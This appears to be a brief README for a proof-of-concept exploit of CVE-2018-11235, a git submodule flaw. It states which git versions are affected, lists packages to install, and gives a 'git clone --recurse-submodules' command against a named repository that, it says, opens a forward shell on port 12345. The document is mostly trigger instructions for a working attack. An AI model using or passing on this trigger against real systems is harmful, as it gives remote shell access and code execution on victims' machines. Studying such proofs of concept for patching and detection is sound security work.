### CVE-2018-11235
```
Trigger exploit by following command will open a forward shell to port 12345

### git version must between 2.14.x to 2.17.0

$ sudo apt-get update
$ sudo apt-get install socat git autoconf tclsh gettext
$ git clone --recurse-submodules https://sense.cs.nctu.edu.tw/git/pandaft/git-cve-2018-11235.git dest_dir

```

